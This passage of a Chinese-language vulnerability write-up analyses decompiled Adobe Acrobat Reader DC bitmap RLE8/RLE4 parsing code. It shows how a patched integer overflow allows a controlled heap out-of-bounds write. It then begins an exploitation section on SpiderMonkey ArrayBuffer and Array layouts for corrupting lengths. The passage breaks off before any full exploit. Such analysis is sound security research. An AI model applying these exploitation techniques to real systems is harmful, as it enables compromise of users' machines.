*)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            line[xpos++] = BYTE1(cmd);</span><br><span class="line">            ++index;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// 展开数据</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )        <span class="comment">// 第一字节为零且第二字节不为零</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )      <span class="comment">// 位图结束</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta 数据</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;           <span class="comment">// 向右移动</span></span><br><span class="line">          ypos -= ydelta;           <span class="comment">// 向上移动</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                        <span class="comment">// 未压缩数据</span></span><br><span class="line">        &#123;</span><br><span class="line">          dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// 整数溢出检查</span></span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">              line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              line[xpos++] = value;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              ++index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( index &lt; BYTE1(cmd) );   <span class="comment">// 读取未压缩数据</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( count &amp; <span class="number">1</span> )                  <span class="comment">// 数据对齐</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// 当前行结束</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// 从下往上移动一行</span></span><br><span class="line">        xpos = <span class="number">0</span>;                           <span class="comment">// 移动到行的起点</span></span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof(v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>基于前面的补丁分析，很明显下面的 <code>if</code> 语句中存在整数溢出：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 20CF501F AcroForm 2019.012.20036 中修复的基本块</span></span><br><span class="line">dst_xpos = (<span class="keyword">unsigned</span> __int8)cmd + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &gt; width || </span><br><span class="line">     dst_xpos &lt; xpos || dst_xpos &lt; (<span class="keyword">unsigned</span> __int8)cmd )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_176;</span><br></pre></td></tr></table></figure>
<p>这里在计算 <code>(unsigned __int8)cmd + xpos</code> 时可能导致整数溢出，且其中两个变量的值都可以被控制。在解析特定的 RLE8 数据时，如果触发这里的整数溢出，后续便可以实现堆块越界写。</p>
<ol>
<li>变量 <code>(unsigned __int8)cmd</code> 的值是可以直接控制的，其取值范围为 <code>[1, 255]</code> </li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);           <span class="comment">// 读取 2 字节数据</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>变量 <code>xpos</code> 的值也是可以直接控制的，只需要在 <strong>编码模式</strong> 中布局大量 <code>delta</code> 命令即可使得 <code>xpos</code> 的值接近 <code>0xFFFFFFFF</code> </li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> ) <span class="comment">// delta</span></span><br><span class="line">&#123;</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">  fn_read_bytes(v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">  xpos += xdelta;           <span class="comment">// 向右移动, xdelta 取值范围为 [0, 255]</span></span><br><span class="line">  ypos -= ydelta;           <span class="comment">// 向上移动</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>因为 <code>xpos</code> 非常大（有符号表示为负数），因此在处理 RLE8 压缩数据时可以实现堆块越界写（往低地址方向越界写），并且写的数据也是完全可控的，只不过所有数据都必须是同样的值</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);            <span class="comment">// 可控数据实现堆块越界写</span></span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd ); <span class="comment">// 解压数据</span></span><br></pre></td></tr></table></figure>
<h4 id="4-2-2-RLE4-解析"><a href="#4-2-2-RLE4-解析" class="headerlink" title="4.2.2 RLE4 解析"></a>4.2.2 RLE4 解析</h4><p>函数 <code>sub_20CF3E5F</code> 中负责解析 RLE4 压缩数据的部分代码如下（实现 RLE4 解压的代码比 RLE8 解压的代码稍微复杂一点，因为数据单位不再是一个字节，而是半个字节）：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( bmih.biCompression == <span class="number">2</span> )  <span class="comment">// RLE4 算法</span></span><br><span class="line">&#123;</span><br><span class="line">  xpos = <span class="number">0</span>;                     <span class="comment">// unsigned int, 从左往右</span></span><br><span class="line">  ypos = bmih.biHeight - <span class="number">1</span>;     <span class="comment">// unsigned int, 从下往上</span></span><br><span class="line">  bitmap_ends = <span class="number">0</span>;</span><br><span class="line">  odd_index_ = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !fn_feof(v1[<span class="number">2</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( bitmap_ends )</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      fn_read_bytes(v1[<span class="number">2</span>], &amp;cmd, <span class="number">2u</span>);       <span class="comment">// 读取 2 字节数据</span></span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)cmd )                     <span class="comment">// 第一个字节不为零</span></span><br><span class="line">      &#123;                                     <span class="comment">// 表示有压缩数据等待处理</span></span><br><span class="line">        high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// 高 4 位数据</span></span><br><span class="line">        low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// 低 4 位数据</span></span><br><span class="line">        <span class="comment">// 20CF45F8 变动的基本块之一</span></span><br><span class="line">        <span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)cmd )</span><br><span class="line">        &#123;</span><br><span class="line">          xpos_ = odd_index_;</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            odd_index = index &amp; <span class="number">1</span>;</span><br><span class="line">            line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">            _4bits = high_4bits;            <span class="comment">// 偶数索引 -&gt; 高 4 位数据</span></span><br><span class="line">            <span class="keyword">if</span> ( odd_index )                <span class="comment">// 奇数索引 -&gt; 低 4 位数据</span></span><br><span class="line">              _4bits = low_4bits;</span><br><span class="line">            <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )                <span class="comment">// xpos 为奇数, 存入已有字节</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] |= _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>                            <span class="comment">// xpos 为偶数, 存入新的字节</span></span><br><span class="line">            &#123;</span><br><span class="line">              line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">            &#125;</span><br><span class="line">            ++xpos_;</span><br><span class="line">            index = index + <span class="number">1</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br><span class="line">          odd_index_ = xpos_;</span><br><span class="line">          xpos = odd_index_;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) )                <span class="comment">// 第一字节为零且第二字节不为零</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">1</span> )              <span class="comment">// 位图结束</span></span><br><span class="line">        &#123;</span><br><span class="line">          bitmap_ends = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( BYTE1(cmd) == <span class="number">2</span> )         <span class="comment">// delta 数据</span></span><br><span class="line">        &#123;</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;xdelta, <span class="number">1u</span>);</span><br><span class="line">          fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;ydelta, <span class="number">1u</span>);</span><br><span class="line">          xpos += xdelta;                   <span class="comment">// 向右移动</span></span><br><span class="line">          ypos -= ydelta;                   <span class="comment">// 向上移动</span></span><br><span class="line">          odd_index_ = xpos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 20CF44EA 变动的基本块之一</span></span><br><span class="line">          <span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br><span class="line">          index = <span class="number">0</span>;</span><br><span class="line">          odd_index = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( BYTE1(cmd) )                 <span class="comment">// 未压缩数据</span></span><br><span class="line">          &#123;</span><br><span class="line">            xpos_ = odd_index_;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">              odd_index_ = index &amp; <span class="number">1</span>;</span><br><span class="line">              <span class="keyword">if</span> ( !(index &amp; <span class="number">1</span>) )           <span class="comment">// 读取 1 字节数据</span></span><br><span class="line">              &#123;</span><br><span class="line">                fn_read_bytes((_DWORD *)v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">                low_4bits_ = value &amp; <span class="number">0xF</span>;   <span class="comment">// 低 4 位数据</span></span><br><span class="line">                high_4bits_ = value &gt;&gt; <span class="number">4</span>;   <span class="comment">// 高 4 位数据</span></span><br><span class="line">              &#125;</span><br><span class="line">              byte_slot = xpos_ &gt;&gt; <span class="number">1</span>;</span><br><span class="line">              line = fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">              _4bits = high_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( odd_index_ )</span><br><span class="line">                _4bits = low_4bits_;</span><br><span class="line">              <span class="keyword">if</span> ( xpos_ &amp; <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] |= _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                line[byte_slot] = <span class="number">16</span> * _4bits;</span><br><span class="line">              &#125;</span><br><span class="line">              ++xpos_;</span><br><span class="line">              count = BYTE1(cmd);</span><br><span class="line">              not_ended = odd_index++ + <span class="number">1</span> &lt; BYTE1(cmd);</span><br><span class="line">              index = odd_index;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ( not_ended );</span><br><span class="line">            odd_index_ = xpos_;</span><br><span class="line">            xpos = odd_index_;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( (count &amp; <span class="number">3u</span>) - <span class="number">1</span> &lt;= <span class="number">1</span> )      <span class="comment">// 数据对齐</span></span><br><span class="line">            fn_read_bytes(v1[<span class="number">2</span>], &amp;value, <span class="number">1u</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>                                  <span class="comment">// 当前行结束</span></span><br><span class="line">      &#123;</span><br><span class="line">        --ypos;                             <span class="comment">// 从下往上移动一行</span></span><br><span class="line">        xpos = <span class="number">0</span>;                           <span class="comment">// 移动到行的起点</span></span><br><span class="line">        odd_index_ = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      result = fn_feof((_DWORD *)v1[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !result );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里在两个位置可以触发整数溢出，其中一处位于处理压缩数据的过程中：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// 高 4 位数据</span></span><br><span class="line">low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// 低 4 位数据</span></span><br><span class="line"><span class="comment">// 20CF45F8 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure>
<p>另一处位于处理未压缩数据的过程中：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF44EA 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure>
<h2 id="0x05-漏洞利用"><a href="#0x05-漏洞利用" class="headerlink" title="0x05. 漏洞利用"></a>0x05. 漏洞利用</h2><h3 id="5-1-溢出目标"><a href="#5-1-溢出目标" class="headerlink" title="5.1 溢出目标"></a>5.1 溢出目标</h3><p>前面提到在解析 RLE 数据时发现了 3 个溢出点，这里选择其中相对容易写利用的溢出点来触发漏洞：位于 RLE8 数据解析过程中的一处整数溢出。</p>
<p>RLE4 数据解析过程中存在的两处溢出点很难实现稳定利用，因为在向扫描线填充像素数据时，偏移值为 <code>xpos</code> 的值除以 <code>2</code> ，此时偏移值最大可以是 <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> ，也就意味着仅能向高地址方向实现堆块越界写，而且这个地址上具体是什么数据很难控制。</p>
<p>而 RLE8 数据解析过程中存在的溢出点就相对好控制一些，因为在向扫描线填充像素数据时，偏移值就是 <code>xpos</code> 本身，这样就可以向低地址方向实现堆块越界写，而且越界写的范围在一定程度上也是可控的。在下面的代码中，<code>(unsigned __int8)cmd</code> 的最大值可以是 <code>0xFF</code> ，为了绕过 <code>if</code> 语句中的条件检查，<code>xpos</code> 的最小值是 <code>0xFFFFFF01</code> （在有符号类型下表示为 <code>-255</code>）。这也就意味着最大可以向低地址方向越界写 <code>0xFF</code> 字节的数据。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F 变动的基本块之一</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure>
<p>但需要注意的是，用于越界写的数据必须是一样的，即只能是同一个字节。这会给漏洞利用带来一些额外的问题，后续会对此进行详细讨论。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);</span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br></pre></td></tr></table></figure>
<h3 id="5-2-SpiderMonkey-基础知识"><a href="#5-2-SpiderMonkey-基础知识" class="headerlink" title="5.2 SpiderMonkey 基础知识"></a>5.2 SpiderMonkey 基础知识</h3><p>Adobe Acrobat Reader DC 所使用的 JavaScript 引擎为 <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> ，在编写利用代码之前，先简单介绍一下相关的基础知识。</p>
<h4 id="5-2-1-ArrayBuffer"><a href="#5-2-1-ArrayBuffer" class="headerlink" title="5.2.1 ArrayBuffer"></a>5.2.1 ArrayBuffer</h4><p>对 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> 而言，当 <code>byteLength</code> 的大小超过 <code>0x68</code> 时，其底层数据存储区（<strong>backing store</strong>）所在的堆块将通过系统堆申请（<code>ucrtbase!calloc</code>）；当 <code>byteLength</code> 的大小小于等于 <code>0x68</code> 时，堆块从 SpiderMonkey 的私有堆 <strong>tenured heap</strong> 申请。同时，当 <strong>backing store</strong> 独立申请堆块时，需要额外申请 <code>0x10</code> 字节的空间用于存储 <code>ObjectElements</code> 对象。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;               <span class="comment">// 可以是任意值，通常为 0</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;   <span class="comment">// byteLength</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;            <span class="comment">// view 对象指针</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;              <span class="comment">// 可以是任意值，通常为 0</span></span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>对 <code>ArrayBuffer</code> 而言，这里 <code>ObjectElements</code> 的各个成员的名字是没有意义的（因为本来是为 <code>Array</code> 准备的），这里第二个成员 <code>initializedLength</code> 存储 <code>byteLength</code> 的值，第三个成员 <code>capacity</code> 存储关联的 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView</a> 对象的指针，其他成员可以是任意值。</p>
<p>在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line">dv.setUint32(<span class="number">0</span>, <span class="number">0x41424344</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<p><code>ArrayBuffer</code> 对象的 <strong>backing store</strong> 的内存布局如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">34d54f80  00000000 00000070 2458f608 00000000</span><br><span class="line">;         data</span><br><span class="line">34d54f90  41424344 00000000 00000000 00000000</span><br><span class="line">34d54fa0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fb0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fc0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fd0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fe0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54ff0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure>
<p>在漏洞利用过程中，如果可以更改 <code>ArrayBuffer</code> 对象的 <code>byteLength</code> 为一个更大的值，那么就可以基于 <code>ArrayBuffer</code> 对象实现越界读写了。不过需要注意后面的 <code>4</code> 字节数据要么为零，要么指向一个 <strong>合法</strong> 的 <code>DataView</code> 对象，否则进程会立刻崩溃。</p>
<h4 id="5-2-2-Array"><a href="#5-2-2-Array" class="headerlink" title="5.2.2 Array"></a>5.2.2 Array</h4><p>对 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array</a> 而言，当 <code>length</code> 的大小超过 <code>14</code> 时，其底层元素存储区所在的堆块将通过系统堆申请（<code>ucrtbase!calloc</code>）；当 <code>length</code> 的大小小于等于 <code>14</code> 时，堆块从 SpiderMonkey 的私有堆 <strong>nursery heap</strong> 申请。和 <code>ArrayBuffer</code> 一样，当底层元素存储区独立申请堆块时，需要额外申请 <code>0x10</code> 字节的空间用于存储 <code>ObjectElements</code> 对象。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// The NumShiftedElementsBits high bits of this are used to store the</span></span><br><span class="line">  <span class="comment">// number of shifted elements, the other bits are available for the flags.</span></span><br><span class="line">  <span class="comment">// See Flags enum above.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Number of initialized elements. This is &lt;= the capacity, and for arrays</span></span><br><span class="line"><span class="comment">   * is &lt;= the length. Memory for elements above the initialized length is</span></span><br><span class="line"><span class="comment">   * uninitialized, but values between the initialized length and the proper</span></span><br><span class="line"><span class="comment">   * length are conceptually holes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of allocated slots. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 'length' property of array objects, unused for other objects. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;</span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在 Adobe Acrobat Reader DC 中执行下面的 JavaScript 代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">15</span>);</span><br><span class="line">array[<span class="number">0</span>] = array[array.length - <span class="number">1</span>] = <span class="number">0x41424344</span>;</span><br></pre></td></tr></table></figure>
